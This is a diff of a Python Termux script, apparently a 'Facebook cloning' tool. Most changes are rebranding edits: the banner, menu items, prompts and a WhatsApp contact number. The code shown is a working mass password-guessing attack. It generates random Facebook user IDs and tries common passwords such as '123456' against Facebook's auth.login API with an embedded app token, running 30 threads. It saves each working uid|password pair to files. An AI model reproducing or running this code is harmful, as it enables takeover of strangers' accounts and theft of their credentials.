@@ -1,4 +1,4 @@
-#DIPTO
+#DIPTO 
 # Time Succes decompile : 2022-05-22 23:34:12.924217
 W = '\033[97;1m'
 R = '\033[91;1m'
@@ -78,9 +78,9 @@ def clear():
 def back():
 	login()
 
-ah="TRICKER-"
+ah="SARKAR-"
 imt="-M4786=="
-ak="DIPTO-"
+ak="DIPTO -"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[DIPTO] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[DIPTO ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -379,16 +379,12 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m 
-\033[1;32m ######  ### ######  ####### ####### 
-\033[1;32m #     #  #  #     #    #    #     # 
-\033[1;32m #     #  #  #     #    #    #     # 
-\033[1;32m #     #  #  ######     #    #     # 
-\033[1;32m #     #  #  #          #    #     # 
- \033[1;32m#     #  #  #          #    #     # 
-\033[1;32m ######  ### #          #    ####### 
-                                     
-                                              
-
+\033[1;32m██████  ██ ██████  ████████  ██████  
+\033[1;32m██   ██ ██ ██   ██    ██    ██    ██ 
+\033[1;32m██   ██ ██ ██████     ██    ██    ██ 
+\033[1;32m██   ██ ██ ██         ██    ██    ██ 
+\033[1;32m██████  ██ ██         ██     ██████  
+                                                                              
 
 
 \033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW😽
@@ -396,11 +392,10 @@ logo = ("""\033[1;32m
         
  
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
-  \033[1;32mAuther   :Dipto Sarkar 
-  \033[1;32mFecbook  :Dipto Sarkar 
-  \033[1;32mGithub   :DIPTO103
-  \033[1;32mWhatspp  :+8801840269986
-  \033[1;33m Admin   :Dipto Sarkar 
+  \033[1;32mAuther  :Dipto Sarkar
+  \033[1;32mFecbook :Dipto Sarkar 
+  \033[1;33mGithub  :DIPTO103
+  \033[1;33mAdmin   :Dipto Sarkar 
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
 
 class Main:
@@ -412,22 +407,22 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;36m     UNSUSCRIBE KARNE WALON KA APROVEL URA DEYA JABA")
+		print("\033[1;36m     FOLLOW OUR FACEBOOK PAGE")
 		print("")
 		print("\033[1;32m [1] First You Follow Facebook")
 		print("\033[1;33m [2] Exit")
 		print("")
-		DIPTO = input("\n\033[1;36m  Chose ==> \033[1;32m")
-		if DIPTO in ["", " "]:
+		DIPTO  = input("\n\033[1;36m  Chose ==> \033[1;32m")
+		if DIPTO  in ["", " "]:
 			exit()
-		elif DIPTO in ["2", "02"]:
+		elif DIPTO  in ["2", "02"]:
 			print("    Thanks🥰♥️")
 			exit()
-		elif DIPTO in ["1", "01"]:
+		elif DIPTO  in ["1", "01"]:
 			os.system("xdg-open https://www.facebook.com/profile.php?id=100091484814365&mibextid=D4KYlr")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;33m    Type Your Name")
+			print("\033[1;33m    Apna name type koran")
 			print("")
 			input("\n\033[1;32m  Type Name ==> \033[1;36m")
 			time.sleep(2.1)
@@ -439,8 +434,9 @@ class Main:
 			print(logo)
 		print("\n\033[1;32m [1] File Cloning")
 		print(" [2]\033[1;33m Public Cloning")
-		print(" [3]\033[1;33m 2009-10 Cloning")
-		print(" [4]\033[1;32m 2011-14 Cloning")
+		print(" [3]\033[1;32m Create File")
+		print(" [4]\033[1;33m 2009-10 Cloning")
+		print(" [5]\033[1;32m 2011-14 Cloning")
 		print(" [E]\033[1;33m Exit \n")
 		Ali =input(" Choose : ")
 		if Ali in ["1", "01"]:
@@ -448,8 +444,10 @@ class Main:
 		if Ali in ["2", "02"]:
 			Public()
 		if Ali in ["3", "03"]:
-			self.old()
+			os.system("python Dump.py")
 		if Ali in ["4", "04"]:
+			self.old()
+		if Ali in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -462,7 +460,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 3000,5000,10000,50000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -872,12 +870,12 @@ class Main:
 				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-DIPTO -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-DIPTO  -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[DIPTO-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[DIPTO -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-DIPTO-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-DIPTO -OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -898,7 +896,7 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456,678910,246810,135791) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
@@ -1279,7 +1277,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [DIPTO ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [DIPTO  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1296,15 +1294,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[DIPTO-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[DIPTO -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-DIPTO-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-DIPTO -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[DIPTO-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[DIPTO -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-DIPTO-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-DIPTO -OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1330,7 +1328,7 @@ def Subscraption():
 		print(logo)
 		print ("")
 		print(" \033[1;32mThis Toll Paid BUT You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note :THIS TOOL IS PAID   \033[1;37m")
+		print(" \033[1;32m Note :THIS  TOOL ARE PAID   \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1342,12 +1340,12 @@ def Subscraption():
 		print ("")
 		gf = input(" Your Last Name : ")
 		print ("")
-		lol = input(" Your Email : ")
+		lol = input(" Your Your Email : ")
 		print ("")
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+8801840269986?text=' + tks)
+		os.system('am start https://wa.me/+8801840289986?text=' + tks)
 		Subscraption()        
 Subscraption()
 
